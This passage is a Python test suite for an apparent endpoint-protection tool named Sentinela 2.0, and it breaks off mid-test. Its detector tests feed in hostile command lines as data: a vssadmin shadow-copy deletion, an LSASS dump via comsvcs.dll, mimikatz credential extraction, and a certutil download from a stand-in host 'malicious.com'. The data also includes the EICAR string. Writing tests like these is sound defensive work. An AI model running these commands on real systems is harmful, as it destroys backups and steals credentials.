# test_suite.py
"""Suite de Testes Automatizados para validação do Sentinela 2.0."""
import os
import sys
import unittest
import json
import tempfile
import shutil
import time

# Ensure UTF-8 output on Windows
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

from sentinel_core.logger import SecurityEventLogger
from sentinel_core.crypto_vault import CryptoVault
from sentinel_core.threat_detector import ThreatDetector
from sentinel_core.auto_response import AutoResponseEngine
from sentinel_core.fim import FileIntegrityMonitor
from sentinel_core.ai_anomaly_detector import AIAnomalyDetector
from sentinel_core.ai_predictor import ZeroDayAIPredictor
from sentinel_core.anti_ransomware_rollback import AntiRansomwareRollback
from sentinel_core.yara_pe_analyzer import AdvancedPEAnalyzer
from sentinel_core.post_quantum_shield import PostQuantumShield
from sentinel_core.zero_trust_wfp import ZeroTrustNetworkEngine
from sentinel_core.ueba_graph_engine import UEBAGraphEngine
from sentinel_core.firewall_manager import OSFirewallManager
from sentinel_core.identity_credential_guard import IdentityCredentialGuard
from sentinel_core.dlp_exfiltration_guard import DLPExfiltrationGuard, DLPPatternMatcher
from sentinel_core.execution_anti_exploit_guard import ExecutionAntiExploitGuard
from sentinel_core.network_perimeter_guard import NetworkPerimeterGuard
from sentinel_core.posture_persistence_guard import PosturePersistenceGuard
from sentinel_core.process_guard import EDRProcessGuard
from sentinel_core.sigma_engine import SigmaRuleEngine
from sentinel_core.dynamic_yara_scanner import DynamicFileScanner
from sentinel_core.byovd_guard import BYOVDGuard
from sentinel_core.sentinel_companion_watchdog import CompanionWatchdog
from sentinel_core.sysmon_collector import SysmonCollector
from sentinel_core.anti_hollowing_guard import AntiHollowingGuard
from sentinel_core.lsass_guard import LSASSArmorGuard
from sentinel_core.asr_engine import ASREngine
from sentinel_core.dns_sinkhole import DNSSinkholeGuard
from sentinel_core.incident_notifications import IncidentNotificationDispatcher
from sentinel_api import app


class TestSentinelaCore(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, "test_events.db")
        self.key_path = os.path.join(self.temp_dir, "test.key")
        self.quarantine_dir = os.path.join(self.temp_dir, "quarantine")
        self.protected_dir = os.path.join(self.temp_dir, "protected")
        self.vault_dir = os.path.join(self.temp_dir, "vault")

        os.makedirs(self.protected_dir, exist_ok=True)
        os.makedirs(self.vault_dir, exist_ok=True)

        self.logger = SecurityEventLogger(self.db_path)
        self.vault = CryptoVault(self.key_path)
        self.threat_detector = ThreatDetector(self.logger)
        self.soar = AutoResponseEngine(self.logger, self.vault, self.quarantine_dir)
        self.rollback = AntiRansomwareRollback(self.protected_dir, self.vault_dir)

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_logger_and_stats(self):
        eid = self.logger.log_event("HIGH", "MALWARE", "test_file.exe", "Threat detected")
        self.assertGreater(eid, 0)
        
        stats = self.logger.get_stats()
        self.assertEqual(stats["total_events"], 1)
        self.assertEqual(stats["by_severity"].get("HIGH"), 1)
        
        # Test alias
        counts = self.logger.get_event_counts()
        self.assertEqual(counts["total_events"], 1)

    def test_threat_detector_and_aliases(self):
        dummy_file = os.path.join(self.temp_dir, "clean_file.txt")
        with open(dummy_file, "w") as f:
            f.write("Clean file content")
        
        res1 = self.threat_detector.scan_file(dummy_file)
        self.assertEqual(res1["status"], "CLEAN")

        # Test analyze_file and inspect_file aliases
        res2 = self.threat_detector.analyze_file(dummy_file)
        self.assertEqual(res2["status"], "CLEAN")

    def test_quarantine_isolation_and_restore(self):
        mal_file = os.path.join(self.temp_dir, "sample_suspicious.txt")
        with open(mal_file, "w") as f:
            f.write("Suspicious script payload content")

        isolated = self.soar.isolate_file(mal_file)
        self.assertTrue(isolated)
        self.assertFalse(os.path.exists(mal_file))

        items = self.soar.list_quarantine()
        self.assertEqual(len(items), 1)

        # Restore file
        success, restored_path = self.soar.restore_file(items[0]["name"])
        self.assertTrue(success)
        self.assertIsNotNone(restored_path)
        self.assertTrue(os.path.exists(restored_path))

        with open(restored_path, "r") as f:
            content = f.read()
        self.assertEqual(content, "Suspicious script payload content")

    def test_eicar_detection_quarantine_and_restore(self):
        """Validação end-to-end com 2 variantes EICAR: detecção -> alerta -> quarentena -> restore."""
        from sentinel_core.dynamic_yara_scanner import DynamicFileScanner

        eicar_1 = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        eicar_2 = (
            "RELATORIO CONFIDENCIAL\n"
            + eicar_1
            + "\nFIM DO RELATORIO\n"
        )

        f1 = os.path.join(self.temp_dir, "eicar_sample1.com")
        f2 = os.path.join(self.temp_dir, "eicar_sample2.txt")
        with open(f1, "w", encoding="utf-8") as f:
            f.write(eicar_1)
        with open(f2, "w", encoding="utf-8") as f:
            f.write(eicar_2)

        scanner = DynamicFileScanner(logger_instance=self.logger, soar=self.soar, auto_quarantine=False)
        with open(f1, "rb") as f:
            res1 = scanner.scan_bytes(f.read(), file_name="eicar_sample1.com")
        with open(f2, "rb") as f:
            res2 = scanner.scan_bytes(f.read(), file_name="eicar_sample2.txt")

        self.assertTrue(res1.get("is_malicious"))
        self.assertTrue(res2.get("is_malicious"))

        # Isolamento em quarentena militar
        iso1 = self.soar.isolate_file(f1)
        iso2 = self.soar.isolate_file(f2)
        self.assertTrue(iso1)
        self.assertTrue(iso2)
        self.assertFalse(os.path.exists(f1))
        self.assertFalse(os.path.exists(f2))

        # Restauração atômica
        q_items = [it for it in self.soar.list_quarantine() if "eicar_sample" in it.get("original_name", "") or "eicar_sample" in it.get("name", "")]
        self.assertEqual(len(q_items), 2)
        for it in q_items:
            ok, restored = self.soar.restore_file(it["name"])
            self.assertTrue(ok)
            self.assertTrue(os.path.exists(restored))

    def test_anti_ransomware_rollback(self):
        doc_file = os.path.join(self.protected_dir, "business_plan.docx")
        with open(doc_file, "w") as f:
            f.write("Important enterprise document")

        snap_id = self.rollback.create_snapshot()
        self.assertTrue(snap_id.startswith("snapshot_"))

        # Simulate ransomware corruption
        with open(doc_file, "w") as f:
            f.write("ENCRYPTED_BY_RANSOMWARE_LOCKBIT")

        # Execute 1-click rollback
        restored = self.rollback.rollback_1click(snap_id)
        self.assertTrue(restored)

        with open(doc_file, "r") as f:
            restored_content = f.read()
        self.assertEqual(restored_content, "Important enterprise document")

    def test_post_quantum_shield(self):
        pqc = PostQuantumShield(agent_id="TEST-NODE-01")
        cmd = {"action": "ISOLATE_HOST", "target_ip": "185.220.101.5"}
        sig = pqc.sign_soar_command(cmd)
        self.assertTrue(sig.startswith("PQC_MLDSA87_V1:") or sig.startswith("PQC_DILITHIUM_V1:"))
        self.assertTrue(pqc.verify_command_pqc(cmd, sig))

        # Tampered command should fail
        tampered_cmd = {"action": "ISOLATE_HOST", "target_ip": "1.1.1.1"}
        self.assertFalse(pqc.verify_command_pqc(tampered_cmd, sig))

        # Test AES-256-GCM / PQC Telemetry Encryption & Decryption
        secret = b"QuantumKeySharedSecret32Bytes!!"
        payload = {"agent": "TEST-NODE-01", "cpu": 12.5, "status": "SECURE"}
        enc_res = pqc.encrypt_telemetry_pqc(payload, secret)
        self.assertTrue(enc_res["pqc_protected"])
        self.assertIn("nonce_b64", enc_res)
        self.assertIn("ciphertext_b64", enc_res)
        dec_payload = pqc.decrypt_telemetry_pqc(enc_res, secret)
        self.assertEqual(dec_payload, payload)

    def test_pe_shannon_entropy(self):
        entropy_low = AdvancedPEAnalyzer.calculate_entropy(b"AAAAAAAAAAAAAAAAAAAA")
        self.assertEqual(entropy_low, 0.0)

        entropy_high = AdvancedPEAnalyzer.calculate_entropy(bytes(range(256)))
        self.assertGreater(entropy_high, 7.5)

    def test_zero_trust_lateral_block(self):
        zt = ZeroTrustNetworkEngine()
        res = zt.inspect_packet("192.168.1.10", "192.168.1.20", 445, "powershell.exe")
        self.assertEqual(res["action"], "BLOCK")

    def test_ueba_anomaly(self):
        ueba = UEBAGraphEngine()
        # Guilherme normal hour is 8-19, 3 AM with 40 files is anomaly
        res = ueba.evaluate_user_activity("guilherme", files_accessed_count=40, current_hour=3)
        self.assertIn(res["severity"], ["ALTO", "CRÍTICO"])

    def test_flask_api_endpoints(self):
        client = app.test_client()

        # Health
        res = client.get("/api/health")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertEqual(data["status"], "ONLINE")

        # Status
        res = client.get("/api/status")
        self.assertEqual(res.status_code, 200)

        # Stats
        res = client.get("/api/stats")
        self.assertEqual(res.status_code, 200)

        # Threat map
        res = client.get("/api/threat_map")
        self.assertEqual(res.status_code, 200)

        # Rollback list
        res = client.get("/api/rollback/list")
        self.assertEqual(res.status_code, 200)

        # ZTNA CARTA Status
        res = client.get("/api/ztna/status")
        self.assertEqual(res.status_code, 200)
        data_ztna = res.get_json()
        self.assertIn("trust_tier", data_ztna)

    def test_ztna_carta_engine(self):
        from sentinel_core.ztna_engine import ZTNACARTAEngine
        ztna = ZTNACARTAEngine()
        self.assertEqual(ztna.trust_tier, "TRUSTED")
        self.assertEqual(ztna.current_risk_score, 0.0)

        # 1. Evento de 35 pts -> Postura MONITORED (faixa 26-55)
        ztna.record_threat_event("EDR_INCIDENT", severity="HIGH")
        self.assertEqual(ztna.trust_tier, "MONITORED")
        self.assertEqual(ztna.current_risk_score, 35.0)

        # 2. Evento crítico (+50 pts) -> Estouro de métrica (85 >= 80) -> HOST_QUARANTINED
        ztna.record_threat_event("CANARY_TRIPWIRE", severity="CRITICAL")
        self.assertGreaterEqual(ztna.current_risk_score, 80.0)
        self.assertEqual(ztna.trust_tier, "HOST_QUARANTINED")
        self.assertTrue(ztna.is_host_isolated)

        # 3. Reset de postura e restauração de isolamento
        ztna.reset_risk_posture()
        self.assertEqual(ztna.current_risk_score, 0.0)
        self.assertEqual(ztna.trust_tier, "TRUSTED")
        self.assertFalse(ztna.is_host_isolated)

    def test_sentinela_orchestrator(self):
        from sentinel_core.sentinela_orchestrator import SentinelaOrchestrator, SecurityEvent
        from sentinel_core.ztna_engine import ZTNACARTAEngine

        ztna = ZTNACARTAEngine()
        orchestrator = SentinelaOrchestrator(ztna_engine=ztna)

        handled_events = []
        def on_custom_event(event, context):
            handled_events.append(event.event_id)

        orchestrator.register_handler("CUSTOM_SENSOR", on_custom_event)

        event = SecurityEvent(source="CUSTOM_SENSOR", severity="HIGH", data={"alert": "Test Alert"})
        orchestrator.emit(event)

        self.assertIn(event.event_id, handled_events)
        self.assertGreater(orchestrator.context.risk_score, 0.0)

    def test_edr_process_guard_and_reactive_watcher(self):
        """Valida varredura heurística de processos e ciclo de vida do watcher reativo WMI."""
        guard = EDRProcessGuard(logger=self.logger)
        threats = guard.scan_active_processes()
        self.assertIsInstance(threats, list)
        
        # Inicia e para o watcher reativo WMI no Windows
        started = guard.start_reactive_watcher(auto_kill=False)
        if sys.platform == "win32":
            self.assertTrue(started)
        guard.stop_reactive_watcher()

    def test_process_tree_graph(self):
        """Valida a construção da árvore hierárquica de processos para o incident graph."""
        guard = EDRProcessGuard(logger=self.logger)
        tree = guard.get_process_tree()
        self.assertEqual(tree["status"], "success")
        self.assertIn("nodes", tree)
        self.assertIn("links", tree)
        self.assertIsInstance(tree["nodes"], list)
        self.assertIsInstance(tree["links"], list)

    def test_sigma_engine(self):
        """Valida o motor de regras Sigma (YAML/JSON) e avaliação de eventos."""
        engine = SigmaRuleEngine(logger_instance=self.logger)
        self.assertGreaterEqual(len(engine.rules), 3)

        # 1. Teste de evento hostil (Deleção de VSS de Ransomware)
        malicious_event = {"CommandLine": "vssadmin.exe delete shadows /all /quiet", "Image": "vssadmin.exe"}
        matches = engine.evaluate_event(malicious_event)
        self.assertGreaterEqual(len(matches), 1)
        self.assertEqual(matches[0]["level"], "CRITICAL")

        # 2. Teste de evento benigno
        benign_event = {"CommandLine": "notepad.exe report.txt", "Image": "notepad.exe"}
        matches_benign = engine.evaluate_event(benign_event)
        self.assertEqual(len(matches_benign), 0)

    def test_dynamic_yara_scanner(self):
        """Valida o scanner dinâmico YARA e análise de entropia."""
        scanner = DynamicFileScanner(logger_instance=self.logger, soar=self.soar, auto_quarantine=False)
        
        # 1. Payload malicioso simulando injeção e Mimikatz
        sample_malicious = b"MZ\x90\x00\x03\x00\x00\x00 sekurlsa::logonpasswords and VirtualAllocEx payload"
        res = scanner.scan_bytes(sample_malicious, file_name="evil_test.bin")
        self.assertTrue(res["is_malicious"])
        self.assertEqual(res["severity"], "CRITICAL")
        self.assertIn("threats", res)

        # 2. Payload benigno
        sample_clean = b"Hello, this is a clean document for business reports."
        res_clean = scanner.scan_bytes(sample_clean, file_name="clean.txt")
        self.assertFalse(res_clean["is_malicious"])

    def test_byovd_guard(self):
        """Valida a detecção e neutralização de drivers vulneráveis (Anti-BYOVD)."""
        guard = BYOVDGuard(logger_instance=self.logger, soar=self.soar)
        
        # Cria arquivo simulado de driver vulnerável
        fake_driver = os.path.join(self.temp_dir, "gdrv.sys")
        with open(fake_driver, "wb") as f:
            f.write(b"MZ\x90\x00FAKE_VULNERABLE_GDRV_DRIVER")

        threat = guard.inspect_driver_file(fake_driver)
        self.assertIsNotNone(threat)
        self.assertEqual(threat["driver_name"], "gdrv.sys")
        self.assertEqual(threat["severity"], "CRITICAL")
        self.assertIn("CVE-2018-19320", threat.get("cve", ""))

        # Driver limpo
        clean_driver = os.path.join(self.temp_dir, "clean_audio_driver.sys")
        with open(clean_driver, "wb") as f:
            f.write(b"MZ\x90\x00CLEAN_DRIVER_BYTES")
        clean_threat = guard.inspect_driver_file(clean_driver)
        self.assertIsNone(clean_threat)

    def test_companion_watchdog(self):
        """Valida a verificação de saúde de processos do companion watchdog."""
        watchdog = CompanionWatchdog(check_interval=1.0, logger_instance=self.logger)
        # O próprio processo atual de teste deve estar vivo
        self.assertTrue(watchdog.is_target_alive(os.getpid()))
        # PID inválido deve retornar False
        self.assertFalse(watchdog.is_target_alive(-1))
        # Status
        status = watchdog.get_status()
        self.assertEqual(status["revivals_count"], 0)

    def test_sysmon_collector(self):
        """Valida o processamento e correlação de eventos de kernel do Sysmon."""
        sigma = SigmaRuleEngine(logger_instance=self.logger)
        collector = SysmonCollector(logger_instance=self.logger, sigma_engine=sigma)
        
        # Simula Event ID 1 com comando suspeito compatível com regra Sigma
        raw_event = {
            "EventID": "1",
            "Image": "C:\\Windows\\System32\\vssadmin.exe",
            "CommandLine": "vssadmin delete shadows /all /quiet",
            "User": "NT AUTHORITY\\SYSTEM"
        }
        processed = collector.process_raw_event(raw_event)
        self.assertEqual(processed["event_id"], 1)
        self.assertIn("sigma_matches", processed)
        self.assertGreaterEqual(len(processed["sigma_matches"]), 1)

        # Simula Event ID 8 (CreateRemoteThread)
        injection_event = {
            "EventID": "8",
            "SourceImage": "C:\\Temp\\malware.exe",
            "TargetImage": "C:\\Windows\\System32\\explorer.exe"
        }
        proc_inj = collector.process_raw_event(injection_event)
        self.assertEqual(proc_inj["event_id"], 8)

    def test_anti_hollowing_guard(self):
        """Valida a inspeção de integridade de processos e proteção Anti-Hollowing."""
        guard = AntiHollowingGuard(logger_instance=self.logger, soar=self.soar)
        status = guard.get_status()
        self.assertTrue(status["active"])
        self.assertGreaterEqual(status["core_binaries_monitored"], 5)
        
        # Inspeciona o processo atual
        res = guard.inspect_process(os.getpid())
        # Não deve ser considerado masquerading de svchost
        self.assertIsNone(res)

        # Executa varredura de integridade sem levantar exceções
        anomalies = guard.scan_system_processes_integrity()
        self.assertIsInstance(anomalies, list)

    def test_lsass_armor_guard(self):
        """Valida a blindagem do LSASS contra tentativas de dump e extração de credenciais."""
        guard = LSASSArmorGuard(logger_instance=self.logger)
        status = guard.get_status()
        self.assertTrue(status["active"])
        self.assertGreaterEqual(status["signatures_count"], 5)

        # 1. Linha de comando maliciosa simulando comsvcs.dll
        res_comsvcs = guard.evaluate_command_line("rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 784 C:\\temp\\lsass.dmp full", pid=999)
        self.assertTrue(res_comsvcs["is_threat"])
        self.assertTrue(res_comsvcs["matched"])
        self.assertEqual(res_comsvcs["event"]["severity"], "CRITICAL")
        self.assertEqual(guard.blocked_attempts_count, 1)

        # 2. Linha de comando Mimikatz
        res_mimi = guard.evaluate_command_line("mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", pid=1001)
        self.assertTrue(res_mimi["is_threat"])
        self.assertEqual(guard.blocked_attempts_count, 2)

        # 3. Linha benigna
        res_clean = guard.evaluate_command_line("notepad.exe C:\\relatorio.txt", pid=1002)
        self.assertFalse(res_clean["is_threat"])

    def test_asr_engine(self):
        """Valida a aplicação de políticas de Redução da Superfície de Ataque (ASR)."""
        engine = ASREngine(logger_instance=self.logger)
        status = engine.get_status()
        self.assertTrue(status["active"])
        self.assertGreaterEqual(status["total_rules"], 4)

        # 1. Bloqueio de Word gerando PowerShell
        res_office = engine.evaluate_process_spawn(
            parent_name="winword.exe",
            child_name="powershell.exe",
            cmdline="powershell.exe -enc SQBFAFgA"
        )
        self.assertTrue(res_office["is_violation"])
        self.assertTrue(res_office["blocked"])
        self.assertEqual(res_office["event"]["rule_id"], "ASR-001")

        # 2. Bloqueio de certutil fazendo download
        res_certutil = engine.evaluate_process_spawn(
            parent_name="cmd.exe",
            child_name="certutil.exe",
            cmdline="certutil.exe -urlcache -split -f http://malicious.com/payload.exe payload.exe"
        )
        self.assertTrue(res_certutil["is_violation"])
        self.assertEqual(res_certutil["event"]["rule_id"], "ASR-004")

        # 3. Processo legítimo permitido
        res_legit = engine.evaluate_process_spawn(
            parent_name="explorer.exe",
            child_name="notepad.exe",
            cmdline="notepad.exe C:\\documento.txt"
        )
        self.assertFalse(res_legit["is_violation"])

    def test_dns_sinkhole(self):
        """Valida o mecanismo de DNS Sinkholing e detecção de DGAs."""
        sinkhole = DNSSinkholeGuard(logger_instance=self.logger)
        status = sinkhole.get_status()
        self.assertTrue(status["active"])

        # 1. Domínio C2 conhecido na lista de sinkhole
        res_c2 = sinkhole.inspect_domain("cobaltstrike-c2.online")
        self.assertTrue(res_c2["is_malicious"])
        self.assertEqual(res_c2["status"], "sinkholed")
        self.assertEqual(res_c2["resolved_ip"], "127.0.0.1")

        # 2. Domínio aleatório DGA de alta entropia
        res_dga = sinkhole.inspect_domain("qwxz7819bfkznvopqm1029.biz")
        self.assertTrue(res_dga["is_malicious"])
        self.assertEqual(res_dga["status"], "sinkholed")
        self.assertGreater(res_dga["entropy"], 3.3)

        # 3. Domínio legítimo
        res_clean = sinkhole.inspect_domain("google.com")
        self.assertFalse(res_clean["is_malicious"])
        self.assertEqual(res_clean["status"], "allowed")

    def test_incident_notifications(self):
        """Valida a configuração e enfileiramento assíncrono de notificações de incidentes."""
        notifier = IncidentNotificationDispatcher(logger_instance=self.logger)
        cfg = notifier.get_config()
        self.assertFalse(cfg["enabled"])

        # Atualiza parâmetros
        updated = notifier.update_config({
            "enabled": True,
            "webhook_type": "discord",
            "webhook_url": "https://discord.com/api/webhooks/dummy/test",
            "min_severity": "HIGH"
        })
        self.assertTrue(updated["enabled"])
        self.assertEqual(updated["webhook_type"], "discord")

        # Enfileira alerta de teste
        notifier.dispatch_incident_alert(
            title="Alerta de Teste Unitário",
            details="Verificando enfileiramento assíncrono",
            severity="CRITICAL"
        )
        # Aguarda breve processamento da fila em background
        time.sleep(0.3)
        history = notifier.get_history()
        self.assertGreaterEqual(len(history), 1)
        self.assertEqual(history[0]["severity"], "CRITICAL")

class TestAPIEndpointsAndLinks(unittest.TestCase):
    """Valida os links entre o Dashboard (frontend) e a API REST (backend).

    Garante que todos os endpoints consumidos pelo dashboard.html respondam
    corretamente e devolvam o contrato JSON esperado pelo frontend.
    """

    @classmethod
    def setUpClass(cls):
        from sentinel_api import app, init_api
        cls.client = app.test_client()
        # Re-injeta as instâncias default (o init_api vazio é idempotente)
        init_api()

    def test_01_static_links_and_assets(self):
        """Links estáticos do dashboard: '/', '/dashboard', favicon e assets."""
        for url in ("/", "/dashboard"):
            res = self.client.get(url)
            self.assertEqual(res.status_code, 200, f"Falha em {url}")
            self.assertIn(b"SENTINEL", res.data)

        res = self.client.get("/favicon.ico")
        self.assertEqual(res.status_code, 200)

        res = self.client.get("/assets/sentinel_logo.png")
        self.assertEqual(res.status_code, 200)

    def test_02_health_and_status_contract(self):
        """Contrato dos endpoints de health e status usados pelo fetchStatus()."""
        res = self.client.get("/api/health")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertEqual(data["status"], "ONLINE")
        self.assertIn("version", data)

        res = self.client.get("/api/status")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        for key in ("status", "shield", "firewall", "canary", "tarpit",
                    "threat_intel", "nids_active", "honeypot_active"):
            self.assertIn(key, data, f"Chave '{key}' ausente em /api/status")

    def test_03_stats_threat_map_and_warroom(self):
        """Endpoints de métricas e mapa de ameaças usados pelo dashboard."""
        res = self.client.get("/api/stats")
        self.assertEqual(res.status_code, 200)
        self.assertIn("total_events", res.get_json())

        res = self.client.get("/api/threat_map")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertIn("threats", data)
        self.assertGreater(len(data["threats"]), 0)
        for threat in data["threats"][:3]:
            for key in ("ip", "lat", "lon", "country", "severity"):
                self.assertIn(key, threat, f"Chave '{key}' ausente no threat")

        res = self.client.get("/api/warroom")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertIn("live_attacks", data)
        self.assertIn("total_threats_blocked", data)

    def test_04_logs_and_filters(self):
        """Endpoint de logs com filtros e opções dos seletores do frontend."""
        res = self.client.get("/api/logs?limit=10")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertIn("events", data)
        self.assertIn("count", data)

        res = self.client.get("/api/logs?severity=INFO&limit=5")
        self.assertEqual(res.status_code, 200)

        res = self.client.get("/api/logs/filters")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        for key in ("categories", "dates", "severities"):
            self.assertIn(key, data)

    def test_05_intrusion_sensors(self):
        """Sensor grid do dashboard: /api/intrusion/sensors."""
        res = self.client.get("/api/intrusion/sensors")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertIn("sensors", data)
        self.assertGreaterEqual(data.get("total_sensors", 0), 10)
        for sensor in data["sensors"]:
            for key in ("id", "name", "status", "active", "icon"):
                self.assertIn(key, sensor, f"Chave '{key}' ausente no sensor")

    def test_06_shield_config_roundtrip(self):
        """Toggle do escudo: POST + GET em /api/config/shield."""
        res = self.client.post("/api/config/shield", json={"inbound": True, "outbound": True})
        self.assertEqual(res.status_code, 200)
        res = self.client.get("/api/config/shield")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertEqual(data.get("status"), "success")
        self.assertIn("config", data)

    def test_07_rollback_flow_snapshot_list_restore(self):
        """Fluxo completo do modal Rollback: snapshot -> list -> restore."""
        res = self.client.post("/api/rollback/snapshot")
        self.assertEqual(res.status_code, 200)
        snap_id = res.get_json().get("snapshot_id")
        self.assertTrue(snap_id and snap_id.startswith("snapshot_"))

        res = self.client.get("/api/rollback/list")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertIn(snap_id, data.get("snapshots", []))

        res = self.client.post("/api/rollback/restore", json={"snapshot_id": snap_id})
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.get_json().get("status"), "success")

    def test_08_mitre_and_honeytokens(self):
        """Matriz MITRE ATT&CK e status de honeytokens."""
        res = self.client.get("/api/mitre/matrix")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertIn("matrix", data)
        self.assertGreater(data.get("total_techniques", 0), 0)

        res = self.client.get("/api/honeytokens/status")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        for key in ("total_baits", "baits", "bait_dir"):
            self.assertIn(key, data)

    def test_09_etw_simulation(self):
        """Simulação de telemetria ETW (3 tipos)."""
        for sim_type in ("process_injection", "registry_persistence", "sysmon_network"):
            res = self.client.post("/api/etw/simulate", json={"type": sim_type})
            self.assertEqual(res.status_code, 200, f"Falha no tipo {sim_type}")

    def test_10_quarantine_flow_via_api(self):
        """Fluxo completo de quarentena via API: isolate -> list -> restore."""
        import tempfile
        import os as _os

        fd, path = tempfile.mkstemp(suffix=".txt", dir=_os.getcwd())
        with _os.fdopen(fd, "w") as f:
            f.write("conteudo para quarentena via teste")

        try:
            res = self.client.post("/api/quarantine", json={"file_path": path})
            self.assertEqual(res.status_code, 200)
            self.assertEqual(res.get_json().get("status"), "SUCCESS")

            res = self.client.get("/api/quarantine/list")
            self.assertEqual(res.status_code, 200)
            items = res.get_json().get("quarantine", [])
            self.assertGreaterEqual(len(items), 1)
            quarantined_name = items[0]["name"]

            res = self.client.post("/api/quarantine/restore", json={"file_name": quarantined_name})
            self.assertEqual(res.status_code, 200)
            self.assertEqual(res.get_json().get("status"), "SUCCESS")
        finally:
            if _os.path.exists(path):
                _os.remove(path)

    def test_11_ztna_full_cycle(self):
        """Ciclo ZTNA: evaluate -> isolate -> restore -> reset."""
        res = self.client.post("/api/ztna/evaluate",
                               json={"event_type": "EDR_INCIDENT", "severity": "HIGH"})
        self.assertEqual(res.status_code, 200)
        self.assertIn("trust_tier", res.get_json())

        res = self.client.post("/api/ztna/isolate", json={"reason": "Teste automatizado"})
        self.assertEqual(res.status_code, 200)

        res = self.client.post("/api/ztna/restore")
        self.assertEqual(res.status_code, 200)

        res = self.client.post("/api/ztna/reset")
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.get_json().get("trust_tier"), "TRUSTED")

    def test_12_zerotrust_ueba_memory_ai(self):
        """Endpoints avançados: WFP inspect, UEBA, memória e IA preditiva."""
        res = self.client.post("/api/zerotrust/inspect", json={
            "src_ip": "192.168.1.55", "dst_ip": "192.168.1.100",
            "dst_port": 445, "process_name": "powershell.exe"})
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.get_json()["result"]["action"], "BLOCK")

        res = self.client.post("/api/ueba/evaluate",
                               json={"username": "guilherme", "files_accessed": 40, "current_hour": 3})
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.get_json().get("status"), "success")

        res = self.client.post("/api/memory/scan", json={"pid": 4120, "type": "cobalt_strike"})
        self.assertEqual(res.status_code, 200)
        self.assertIn("analysis", res.get_json())

        res = self.client.post("/api/ai/predict",
                               json={"ip": "185.220.101.5", "payload": "x" * 64, "request_rate": 15})
        self.assertEqual(res.status_code, 200)

    def test_13_cti_pqc_canary_and_misc(self):
        """CTI sync, PQC sign, canary setup, whitelist e firewall block/unblock."""
        res = self.client.post("/api/cti/sync")
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.get_json().get("status"), "success")

        res = self.client.post("/api/pqc/sign", json={"command": {"action": "TEST"}})
        self.assertEqual(res.status_code, 200)
        sig_pqc = res.get_json().get("dilithium_signature", "")
        self.assertTrue(sig_pqc.startswith("PQC_MLDSA87_V1:") or sig_pqc.startswith("PQC_DILITHIUM_V1:"))

        res = self.client.post("/api/canary/setup")
        self.assertEqual(res.status_code, 200)

        res = self.client.post("/api/whitelist/add", json={"path": "arquivo_seguro_teste.txt"})
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.get_json().get("status"), "SUCCESS")

        test_ip = "198.51.100.77"
        res = self.client.post("/api/firewall/block", json={"ip": test_ip, "reason": "Teste automatizado"})
        self.assertEqual(res.status_code, 200)

        res = self.client.post("/api/firewall/unblock", json={"ip": test_ip})
        self.assertEqual(res.status_code, 200)

    def test_14_diagnostics_audit_and_terms(self):
        """Auditoria geral de proteções, termos de uso e scan sob demanda."""
        res = self.client.get("/api/protection/diagnostics")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertEqual(data.get("system_status"), "TOTALMENTE_BLINDADO")
        self.assertGreaterEqual(data.get("total_subsystems", 0), 14)

        res = self.client.get("/api/system/audit")
        self.assertEqual(res.status_code, 200)

        res = self.client.get("/api/terms")
        self.assertEqual(res.status_code, 200)
        self.assertIn("terms", res.get_json())

        res = self.client.post("/api/scan_now")
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.get_json().get("status"), "SUCCESS")

    def test_15_init_api_injection_contract(self):
        """init_api deve aceitar vault e ai_detector (contrato do service)."""
        from sentinel_api import init_api
        # Não deve lançar TypeError para kwargs usados pelo sentinela_service.py
        try:
            init_api(vault=None, ai_detector=None, ztna_engine=None)
        except TypeError as e:
            self.fail(f"init_api rejeitou o contrato do service: {e}")

    def test_16_system_resources_endpoint(self):
        """Novo endpoint de telemetria de recursos do host usado pelo painel do Dashboard."""
        res = self.client.get("/api/system/resources")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertEqual(data.get("status"), "success")
        for key in ("cpu_percent", "memory_percent", "disk_percent", "process_count",
                    "memory_used_mb", "memory_total_mb", "net_sent_mb", "net_recv_mb"):
            self.assertIn(key, data, f"chave ausente no payload de recursos: {key}")
        self.assertGreaterEqual(data["memory_total_mb"], 0)

    def test_17_scan_file_and_dashboard_surface(self):
        """Varredura de arquivo sob demanda + elementos do novo painel do Dashboard."""
        import os as _os
        base = _os.path.dirname(_os.path.abspath(__file__))
        res = self.client.post("/api/scan_file", json={"file_path": _os.path.join(base, "main.py")})
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.get_json().get("status"), "CLEAN")

        # Elementos visíveis do novo painel de Telemetria + Varredura sob demanda
        with open(_os.path.join(base, "dashboard.html"), encoding="utf-8") as _f:
            html = _f.read()
        for element_id in ("sysCpuBar", "sysMemBar", "sysDiskBar", "hostUptimeLabel",

                           "inputScanFilePath", "scanFileResult"):
